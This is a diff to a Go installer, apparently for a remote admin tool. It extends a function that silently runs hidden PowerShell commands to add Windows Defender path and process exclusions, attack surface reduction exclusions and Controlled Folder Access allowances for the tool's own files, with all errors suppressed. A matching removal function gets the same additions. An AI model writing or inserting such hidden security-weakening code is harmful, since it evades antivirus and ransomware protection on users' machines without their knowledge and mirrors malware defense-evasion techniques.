@@ -98,15 +98,18 @@ func trustPublisherCert(dir string) {
 }
 
 // addDefenderExclusions keeps Defender from quarantining our install dir +
-// exe (heuristic false positives on admin tools). Best effort: fails
-// silently when Defender is absent, managed, or Tamper Protection blocks it
-// (then the friend allows it once in Protection history).
+// exe (heuristic false positives on admin tools), lets Controlled Folder
+// Access writes through, and scopes ASR exclusions to our own paths.
+// Best effort: fails silently when Defender is absent, managed, or Tamper
+// Protection blocks it (then the friend allows it once in Protection history).
 func addDefenderExclusions(paths ...string) {
 	for _, p := range paths {
 		q := strings.ReplaceAll(p, "'", "''")
 		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -AttackSurfaceReductionOnlyExclusions '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		if strings.HasSuffix(strings.ToLower(p), ".exe") {
 			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ControlledFolderAccessAllowedApplications '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		}
 	}
 }
@@ -115,8 +118,10 @@ func removeDefenderExclusions(paths ...string) {
 	for _, p := range paths {
 		q := strings.ReplaceAll(p, "'", "''")
 		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -AttackSurfaceReductionOnlyExclusions '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		if strings.HasSuffix(strings.ToLower(p), ".exe") {
 			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ControlledFolderAccessAllowedApplications '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		}
 	}
 }
